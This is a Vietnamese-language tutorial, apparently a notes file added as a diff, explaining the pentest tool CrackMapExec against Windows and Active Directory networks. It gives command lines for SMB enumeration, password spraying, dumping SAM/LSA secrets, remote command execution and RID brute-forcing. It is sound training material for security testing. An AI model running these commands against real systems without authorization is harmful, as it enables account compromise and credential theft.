@@ -1,0 +1,94 @@
+crackmapexec (CME) là một công cụ liệt kê, kiểm thử bảo mật và tấn công trên giao thức SMB, RDP, WinRM, MSSQL... chuyên cho pentest/Red Team khi làm việc với hệ thống Windows/Active Directory.
+Nó được gọi vui là Swiss Army knife cho pentester khi gặp môi trường Windows.
+1. Tác dụng của CrackMapExec
+
+    Liệt kê, kiểm tra user, password, hash trên các host trong mạng Windows
+
+    Check thông tin SMB signing, OS, domain, local admin...
+
+    Kiểm tra credential re-use, password spraying
+
+    Dump thông tin nhạy cảm: SAM, LSA secrets, GPP, share, v.v.
+
+    Chạy lệnh từ xa, thực hiện mã độc, enumerate các dịch vụ khác như MSSQL, RDP, WinRM
+
+2. Cách dùng CrackMapExec cơ bản
+1. Liệt kê thông tin SMB
+
+crackmapexec smb <target_ip/range> 
+
+    Kết quả sẽ cho biết OS, tên máy, domain, SMB signing, v.v.
+
+2. Check credential (user/pass)
+
+crackmapexec smb <target_ip/range> -u <user> -p <pass>
+
+    Thử đăng nhập user:pass vào các host mục tiêu (giống hydra nhưng mạnh hơn với AD)
+
+3. Password spraying (kiểm thử nhiều user một mật khẩu)
+
+crackmapexec smb <target_ip/range> -u userlist.txt -p "Winter2024!"
+
+    userlist.txt: danh sách user
+
+    Thử một pass cho nhiều user, giúp tránh bị lock account.
+
+4. Dump thông tin nhạy cảm
+
+    Dump SAM/LSA secrets:
+
+crackmapexec smb <target> -u <user> -p <pass> --sam
+crackmapexec smb <target> -u <user> -p <pass> --lsa
+
+Dump thông tin share:
+
+    crackmapexec smb <target> --shares
+
+5. Remote command execution
+
+Nếu tài khoản là admin:
+
+crackmapexec smb <target> -u <user> -p <pass> -x "ipconfig"
+
+    Chạy lệnh ipconfig từ xa.
+
+6. Kiểm tra WinRM, MSSQL, RDP
+
+    WinRM:
+
+crackmapexec winrm <target> -u <user> -p <pass>
+
+MSSQL:
+
+    crackmapexec mssql <target> -u <user> -p <pass>
+
+3. Một số tuỳ chọn hữu ích
+Tuỳ chọn	Ý nghĩa
+-d <domain>	Chỉ định domain
+-u <user>	User
+-p <pass>	Password
+-H <hash>	NTLM hash
+--local-auth	Đăng nhập local thay vì domain
+-x <cmd>	Chạy lệnh từ xa
+--shares	Liệt kê các thư mục share
+--sam/--lsa	Dump SAM/LSA
+--rid-brute	Brute-force RID để enumerate user
+4. Lưu ý khi dùng CME
+
+    Nên chạy với quyền root (nếu scan nhiều, gửi gói thô).
+
+    Kết hợp với Bloodhound, Impacket, Kerbrute, rpcclient... để kiểm soát Active Directory toàn diện.
+
+    Thường dùng để kiểm tra bảo mật nội bộ công ty hoặc lab học tập.
+
+5. Ví dụ tổng hợp thực tế
+
+crackmapexec smb 10.10.10.0/24 -u users.txt -p '123456' --shares
+
+    Thử đăng nhập và liệt kê share trên toàn dải mạng.
+
+6. Tài liệu tham khảo
+
+    Github: CrackMapExec
+
+    HackTricks CME
